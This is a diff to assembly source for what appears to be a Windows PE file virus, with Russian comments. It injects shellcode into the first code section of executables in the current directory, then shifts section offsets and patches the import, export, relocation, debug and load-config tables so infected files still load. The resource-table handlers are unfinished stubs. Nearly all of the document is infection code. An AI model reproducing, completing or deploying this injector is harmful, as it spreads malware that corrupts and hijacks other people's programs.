@@ -159,6 +159,7 @@ HandleExceptionTable proto CurrentStdcallNotation :cword, :cword, :dword, :dword
 HandleDebugTable proto CurrentStdcallNotation :cword, :cword, :dword, :dword, :dword
 HandleLoadConfTable proto CurrentStdcallNotation :cword, :cword, :dword, :dword, :dword
 HandleRelocs proto CurrentStdcallNotation :cword, :cword, :dword, :dword
+HandleResourceTable :cword, :cword, :dword, :dword
 FindTargetSection proto CurrentStdcallNotation :cword
 
 DefineStdcallProto MessageBoxA, 4
@@ -203,7 +204,7 @@ else
 endif
 
 isFirst db 1	; 1 - если дроп первого шеллкода, потом будет везде 0
-targetDir db "C:/work/code/virus/test", 0 
+targetDir db ".", 0 
 originalEP dq 0
 scInfo SC_PARAMS <0>
 
@@ -265,15 +266,23 @@ INJECTION_SIGN 	equ 050h
     local pSC:cword
     local pSections:cword
     local pTargetSection:cword
-    local offsetAllData:dword
-    local globalSCSize:dword
-    local allignScSize:dword
+    local countSec:cword
+    local i:cword
+    ;local offsetAllData:dword
+    ;local globalSCSize:dword
+    local newCSSize:dword
+    ;local allignScSize:dword
     local RawAddrSc:dword
     local deltaFileSize:dword
     local targetSection:cword
     local sizeMovedData:cword
     local oldFileSize:cword
     local fileAligment:dword
+    local secAligm:dword
+    local sAlignAddSize:dword
+    local fAlignAddSize:dword
+    local dwTmp:dword
+    local cwTmp:cword
 
     mov [VAsc], 0
 
@@ -303,6 +312,16 @@ INJECTION_SIGN 	equ 050h
         ret
     .endif    
 
+    ; расчет
+    ;DbgBreak 
+    mov cdx, [pe]
+    mov cdx, [cdx].PeHeaders.nthead
+    lea cdx, [cdx].IMAGE_NT_HEADERS.OptionalHeader
+    mov ecx, [cdx].IMAGE_OPTIONAL_HEADER.FileAlignment
+    mov [fileAligment], ecx
+    mov ecx, [cdx].IMAGE_OPTIONAL_HEADER.SectionAlignment
+    mov [secAligm], ecx
+
     ; Находим адрес конца первой кодовой секции
     
     invoke FindTargetSection, [pe]
@@ -311,7 +330,25 @@ INJECTION_SIGN 	equ 050h
         invoke sc_printf, addr [cbx + msgErrorCodeSectionNotFound]
         ret
     .endif
+
     mov cdx, cax
+    mov [targetSection], cdx
+    mov ccx, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
+    add ccx, [codeSize]
+    mov [newCSSize], ccx
+    ; _diff = Aligment(vsize, _aligm) - Aligment(_psects[num].Misc.VirtualSize, _aligm);
+    invoke AlignToTop, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize, [secAligm]
+    mov [dwTmp], eax
+    invoke AlignToTop, [newCSSize], [secAligm]
+    sub eax, [dwTmp]
+    mov [sAlignAddSize], eax
+    ; f_diff = Aligment(vsize, f_aligm) - Aligment(_psects[num].Misc.VirtualSize, f_aligm);
+    invoke AlignToTop, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize, [fileAligment]
+    mov [dwTmp], eax
+    invoke AlignToTop, [newCSSize], [fileAligment]
+    sub eax, [dwTmp]
+    mov [fAlignAddSize], eax
+
     mov eax, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
     add eax, [cdx].IMAGE_SECTION_HEADER.VirtualAddress
     mov [VAsc], eax
@@ -320,8 +357,6 @@ INJECTION_SIGN 	equ 050h
     add eax, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
     mov [RawAddrSc], eax
 
-    mov [targetSection], cdx
-
     .if [VAsc] == 0
         invoke sc_printf, addr [cbx+msgErrorSpaceNotFound]
         xor cax, cax
@@ -329,32 +364,29 @@ INJECTION_SIGN 	equ 050h
     .endif
 
     ;DbgBreak
-    mov eax, [VAsc]
-    mov [cbx+scInfo].SC_PARAMS.startRVA, eax 
+    ; mov eax, [VAsc]
+    ; mov [cbx+scInfo].SC_PARAMS.startRVA, eax 
 
-    mov eax, totalEnd - start
-    mov cdx, [pe]
-    mov cdx, [cdx].PeHeaders.nthead
-    lea cdx, [cdx].IMAGE_NT_HEADERS.OptionalHeader
-    mov ecx, [cdx].IMAGE_OPTIONAL_HEADER.FileAlignment
-    mov [fileAligment], ecx
-    invoke AlignToTop, cax, [fileAligment]
-    mov [cbx+scInfo].SC_PARAMS.sizeCurrSc, eax
-    mov [globalSCSize], eax
+    ; mov eax, totalEnd - start
+    
+    ; invoke AlignToTop, cax, [fileAligment]
+    ; mov [cbx+scInfo].SC_PARAMS.sizeCurrSc, eax
+    ; mov [globalSCSize], eax
 
     ; меняем все RVA в директориях
-    mov cdi, [pe]
-    mov cdx, [cdi].PeHeaders.nthead
-    lea cdx, [cdx].IMAGE_NT_HEADERS.OptionalHeader
-    invoke AlignToTop, [globalSCSize], [cdx].IMAGE_OPTIONAL_HEADER.SectionAlignment
-    mov [allignScSize], eax
+    ; mov cdi, [pe]
+    ; mov cdx, [cdi].PeHeaders.nthead
+    ; lea cdx, [cdx].IMAGE_NT_HEADERS.OptionalHeader
+    ; invoke AlignToTop, [globalSCSize], [cdx].IMAGE_OPTIONAL_HEADER.SectionAlignment
+    ; mov [allignScSize], eax
     ;DbgBreak
-    invoke HandleAllTables, [pe], [VAsc], [globalSCSize], eax
+    ;invoke HandleAllTables, [pe], [VAsc], [globalSCSize], eax
+    invoke HandleAllTables, [pe], [VAsc], [fAlignAddSize], [sAlignAddSize]
 
     mov cdi, [pe]
     mov cdi, [cdi].PeHeaders.nthead
     lea cdi, [cdi].IMAGE_NT_HEADERS.OptionalHeader
-    mov ecx, [allignScSize]
+    mov ecx, [sAlignAddSize]
     add [cdi].IMAGE_OPTIONAL_HEADER.SizeOfImage, ecx
     add [cdi].IMAGE_OPTIONAL_HEADER.SizeOfCode, ecx
     add [cdi].IMAGE_OPTIONAL_HEADER.BaseOfData, ecx
@@ -365,7 +397,7 @@ INJECTION_SIGN 	equ 050h
     mov cdx, [pe]
     mov cax, [cdx].PeHeaders.filesize
     mov dword ptr [oldFileSize], eax
-    add eax, [globalSCSize]
+    add eax, [fAlignAddSize]
     invoke LoadPeFile, [cdx].PeHeaders.filename, [pe], cax
 
     mov cax, [pe]
@@ -394,14 +426,12 @@ INJECTION_SIGN 	equ 050h
     ; dst = pe.mem + targetSection->PointerToRawData + targetSection->SizeOfRawData + RawScSize;
     mov edx, [ccx].IMAGE_SECTION_HEADER.PointerToRawData 
     add edx, [ccx].IMAGE_SECTION_HEADER.SizeOfRawData
-    add edx, [globalSCSize]
+    add edx, [fAlignAddSize]
     add cdi, cdx
 
     ; src = pe.mem + targetSection->PointerToRawData + targetSection->SizeOfRawData
     mov cdx, [pe]
     mov csi, [cdx].PeHeaders.mem
-    
-    
     mov ccx, [targetSection]
     mov edx, [ccx].IMAGE_SECTION_HEADER.PointerToRawData 
     add edx, [ccx].IMAGE_SECTION_HEADER.SizeOfRawData
@@ -413,15 +443,42 @@ INJECTION_SIGN 	equ 050h
     mov [sizeMovedData], ccx
     
     invoke sc_memmove, cdi, csi, [sizeMovedData]
-    ;invoke sc_memset, [pSC], 090h, [globalSCSize]
+    invoke sc_memset, [pSC], 041h, [fAlignAddSize]
 
     ;DbgBreak
     mov ccx, [targetSection]
-    mov eax, [globalSCSize]
+    mov eax, [fAlignAddSize]
     add dword ptr [ccx].IMAGE_SECTION_HEADER.SizeOfRawData, eax
     mov eax, totalEnd - start
     add dword ptr [ccx].IMAGE_SECTION_HEADER.Misc.VirtualSize, eax
 
+     ; секции
+    mov cdi, [pe]
+    mov csi, [cdi].PeHeaders.sections
+    xor ccx, ccx
+    xor cax, cax
+
+    mov eax, [cdi].PeHeaders.countSec
+    mov [countSec], eax
+    mov [i], ecx
+    .while ecx < [countSec]
+        ;DbgBreak
+        mov ecx, [VAsc]
+        .if ([csi].IMAGE_SECTION_HEADER.VirtualAddress >= ecx)
+            mov eax, dword ptr [sAlignAddSize]
+            add [csi].IMAGE_SECTION_HEADER.VirtualAddress, eax
+            .if [csi].IMAGE_SECTION_HEADER.PointerToRawData != 0
+                ;invoke AlignToTop, [scSize], [fileAligment]
+                mov eax, dword ptr [fAlignAddSize]
+                add [csi].IMAGE_SECTION_HEADER.PointerToRawData, eax
+            .endif
+        .endif
+        ;mov cdx, [pSections]
+        lea csi, [csi + IMAGE_SECTION_HEADER_SIZE]
+        inc [i]
+        mov ecx, [i]
+    .endw
+    
     
     ; точка вход
     ;add [cdx].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint, eax
@@ -468,7 +525,7 @@ FindTargetSection proc CurrentStdcallNotation uses cbx cdi csi cdx pe:cword
 FindTargetSection endp
 
 ; обработка всех таблиц (если они находятся после первой секции меняем их RVA и RVA, что в них содержатся)
-HandleAllTables proc CurrentStdcallNotation uses cbx cdi cdx pe:cword, scRVA:dword, scSize:dword, allignScSize:dword
+HandleAllTables proc CurrentStdcallNotation uses cbx cdi cdx pe:cword, scRVA:dword, f_diff:dword, v_diff:dword
 
     local countSec:dword
     local fileAligment:dword
@@ -503,58 +560,52 @@ HandleAllTables proc CurrentStdcallNotation uses cbx cdi cdx pe:cword, scRVA:dwo
             add csi, cax        ; csi = pe.mem + VA
             .if [i] == IMAGE_DIRECTORY_ENTRY_IMPORT
                 ;DbgBreak
-                invoke HandleImportTable, [pe], csi, [scRVA], [allignScSize]
+                invoke HandleImportTable, [pe], csi, [scRVA], [v_diff]
             .elseif [i] ==  IMAGE_DIRECTORY_ENTRY_EXPORT
-                invoke HandleExportTable, [pe], csi, [scRVA], [allignScSize]
+                invoke HandleExportTable, [pe], csi, [scRVA], [v_diff]
             .elseif [i] == IMAGE_DIRECTORY_ENTRY_EXCEPTION
-                invoke HandleExceptionTable, [pe], csi, [scRVA], [allignScSize]
+                invoke HandleExceptionTable, [pe], csi, [scRVA], [v_diff]
             .elseif [i] == IMAGE_DIRECTORY_ENTRY_DEBUG
-                invoke AlignToTop, [scSize], [fileAligment]
-                invoke HandleDebugTable, [pe], csi, [scRVA], eax, [allignScSize]
+                ;invoke AlignToTop, [scSize], [fileAligment]
+                invoke HandleDebugTable, [pe], csi, [scRVA], [f_diff], [v_diff]
             .elseif [i] == IMAGE_DIRECTORY_ENTRY_BASERELOC
-                invoke HandleRelocs, [pe], csi, [scRVA], [allignScSize]
-            .elseif [i] == IMAGE_LOAD_CONFIG_DIRECTORY
-                invoke AlignToTop, [scSize], [fileAligment]
-                invoke HandleLoadConfTable, [pe], csi, [scRVA], eax, [allignScSize]
+                invoke HandleRelocs, [pe], csi, [scRVA], [v_diff]
+            .elseif [i] == IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG
+                ;invoke AlignToTop, [scSize], [fileAligment]
+                invoke HandleLoadConfTable, [pe], csi, [scRVA], [f_diff], [v_diff]
+            .elseif [i] == IMAGE_DIRECTORY_ENTRY_RESOURCE
+                invoke HandleResourceTable, [pe], csi, [scRVA], [v_diff]
             .endif
             
-            mov eax, [allignScSize]
+            mov eax, [v_diff]
             add [cdi].IMAGE_DATA_DIRECTORY.VirtualAddress, eax
         .endif
         inc [i]
         add cdi, IMAGE_DATA_DIRECTORY_SIZE
     .endw    
 
-    ; секции
-    mov cdi, [pe]
-    mov csi, [cdi].PeHeaders.sections
-    xor ccx, ccx
-    xor cax, cax
-
-    mov eax, [cdi].PeHeaders.countSec
-    mov [countSec], eax
-    mov [i], ecx
-    .while ecx < [countSec]
-        ;DbgBreak
-        mov ecx, [scRVA]
-        .if ([csi].IMAGE_SECTION_HEADER.VirtualAddress >= ecx)
-            mov eax, dword ptr [allignScSize]
-            add [csi].IMAGE_SECTION_HEADER.VirtualAddress, eax
-            .if [csi].IMAGE_SECTION_HEADER.PointerToRawData != 0
-                invoke AlignToTop, [scSize], [fileAligment]
-                add [csi].IMAGE_SECTION_HEADER.PointerToRawData, eax
-            .endif
-        .endif
-        ;mov cdx, [pSections]
-        lea csi, [csi + IMAGE_SECTION_HEADER_SIZE]
-        inc [i]
-        mov ecx, [i]
-    .endw
-    
+   
 
 
     ret
 HandleAllTables endp
+
+RecurRCNodeNormalize proc CurrentStdcallNotation uses cbx cdi csi pe:cword, dirAddr:dword, scRVA:dword. v_diff:dword
+
+RecurRCNodeNormalize endp
+
+HandleResourceTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pILCT:cword, scRVA:dword, allignScSize:dword
+
+    ifdef _WIN64
+		mov [rbp + 10h], rcx
+		mov [rbp + 18h], rdx
+		mov [rbp + 20h], r8
+		mov [rbp + 28h], r9
+	endif
+
+
+
+HandleResourceTable endp
 
 HandleLoadConfTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pILCT:cword, scRVA:dword, scSize:dword, allignScSize:dword
 
